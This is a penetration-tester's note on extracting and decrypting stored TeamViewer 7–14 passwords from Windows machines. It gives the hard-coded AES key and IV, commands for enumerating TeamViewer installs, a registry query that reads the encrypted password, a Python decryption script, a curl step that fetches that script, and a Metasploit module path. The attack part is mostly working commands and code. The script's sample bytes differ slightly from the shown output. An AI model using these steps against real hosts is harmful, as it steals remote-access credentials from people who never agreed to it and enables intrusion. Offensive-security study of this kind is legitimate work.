---
Primary_category: "[[APPLICATION CREDENTIALS]]"
title: "TEAMVIEWER"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[APPLICATION CREDENTIALS]]

#### *Theory*

##### *Password Encryption Method*

From *TeamViewer 7* to *TeamViewer 14*, password are stored in encrypted form using the following data →

> **`SecurityPasswordExported` *required for TeamViewer 14***

- ***Encryption Algorithm***

***AES-CBC***

- ***Symmetric Encryption Key***

```bash
0602000000a400005253413100040000
```

- ***Initialization Vector***

```bash
0100010067244F436E6762F25EA8D704
```

---

#### *Enumeration*

##### *Running Processes*

> ***CMD & PS***

```bash
tasklist /svc
```

> ***PS***

```bash
Get-Process -Name '*TeamViewer*' | Select ProcessName, Id
```

```bash
Get-CIMInstance -ClassName win32_process | ? { $_.Name -Match 'TeamViewer' } | Select Name, ProcessID
```

##### *Running Services*

> ***CMD & PS***

```bash
sc.exe queryex
```

> ***PS***

```bash
Get-Service -Name '*Teamviewer*' | Select Name, Status
```

```bash
Get-CIMInstance -ClassName win32_service | ? { $_.Name -Match 'Teamviewer' } | Select Name, State
```

##### *Installed Software*

###### *System Directories*

> ***i.e. "Program Files" and "Program Files (x86)"***

```bash
dir -Path 'C:\Progra~1' -Filter '*TeamViewer*' # Program Files
dir -Path 'C:\Progra~2' -Filter '*TeamViewer*' # Program Files (x86)
```

###### *COM | CIM*

> ***CMD & PS***

```bash
wmic product get name | findstr /I vpn
```

> ***PS***

```bash
Get-WMIObject -Class Win32_Product | ? { $_.Name -Match 'TeamViewer' } | Select Name, Version
```

```bash
Get-CimInstance -ClassName win32_product | ? { $_.Name -Match 'Teamviewer' } | Select Name, Version
```

###### *Windows Registry*

> ***PS***

> [!DANGER]- *Code Snippet*
>
> ```bash
> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-List
> ```
>
---

#### *Abuse - TeamViewer 7*

##### *Extracting Encrypted Secrets*

> ***Namely, SecurityPasswordAES***

> ***PS***

```bash
(Get-ItemProperty 'HKLM:\Software\WOW6432Node\Teamviewer\Version7').SecurityPasswordAES -join ','
```

> [!NOTE]- *Command Output*
>
> ```bash
> 255,155,28,115,214,107,206,49,182,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91
> ```
>

##### *Decrypting Data*

- ***[Decrypt-TeamViewer-Password](https://github.com/S12cybersecurity/Decrypt-TeamViewer-Password/blob/main/password.py)***

> [!BUG]- *e.g.*
>
> ```python
> from itertools import product
> from Crypto.Cipher import AES
> import sys
> 
> class bcolors:
>     OK = '\033[92m' #GREEN
>     WARNING = '\033[93m' #YELLOW
>     ladrrr = '8GY.'
>     ss = 'OWQ1'
>     FAIL = '\033[91m' #RED
>     pinocho_chocho = 'y!c'
>     RESET = '\033[0m' #RESET COLOR
> 
> 
> IV = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
> key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
> 
> ciphertext= bytes([255,155,18,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91])
> decipher = AES.new(key,AES.MODE_CBC,IV)
> plaintext = decipher.decrypt(ciphertext).decode()
> 
> print(f"{bcolors.OK}[+] Password: {bcolors.RESET}"+plaintext)
> 
> ```
>

***Setup***

```bash
curl --silent --location --request GET 'https://raw.githubusercontent.com/S12cybersecurity/Decrypt-TeamViewer-Password/refs/heads/main/password.py' | sed 's@ADD HERE@<ENCRYPTED_DATA>@g' > decrypt.py # Comma-separated
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --location --request GET 'https://raw.githubusercontent.com/S12cybersecurity/Decrypt-TeamViewer-Password/refs/heads/main/password.py' | sed 's@ADD HERE@255,155,18,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91@g' > decrypt.py
> ```
>

```bash
python3 -m venv .venv
. !$/bin/activate && pip3 install pycryptodome
```

***Usage***

```bash
python3 decrypt.py
```

- ***[Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb)***

> **`post/windows/gather/credentials/teamviewer_passwords`**

---

#### *Resources*

***[Why not Security: TeamViewer](https://whynotsecurity.com/blog/teamviewer/)***